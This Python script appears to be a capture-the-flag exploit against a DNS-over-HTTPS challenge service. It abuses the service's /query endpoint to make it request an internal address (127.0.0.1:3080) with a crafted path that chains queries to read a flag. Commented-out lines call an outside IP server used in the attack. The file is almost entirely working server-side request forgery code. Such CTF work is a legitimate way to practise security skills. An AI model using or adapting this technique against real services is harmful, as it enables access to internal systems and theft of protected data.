import json
import requests

# TARGET = 'http://127.0.0.1:3000'
TARGET = 'https://doh.cloud.flu.xxx'

i = 40

# requests.get('http://106.14.153.173:8000/updateLength?len={}'.format(i))

# req = requests.post(TARGET + '/query',
#                     data=json.dumps({
#                         'name': 'dns.google',
#                         'hostname': '106.14.153.173',
#                         'port': 8000,
#                         'path': '/',
#                         'useHttps': False,
#                         'method': 'GET'
#                     }),
#                     headers={'Content-Type': 'application/json'})
# print(req.text)

req = requests.post(
    TARGET + '/query',
    data=json.dumps({
        'name': 'dns.google',
        'hostname': '127.0.0.1',
        'port': 3080,
        'path':
        '/api?query=lastAnswer:dns.google&query=lastAnswer:flag&query=lastAnswer:dns.google&a=',
        'klass': 'IN',
        'type': 'A',
        'useHttps': False,
        'method': 'GET'
    }),
    headers={'Content-Type': 'application/json'})

print(hex(i), req.text)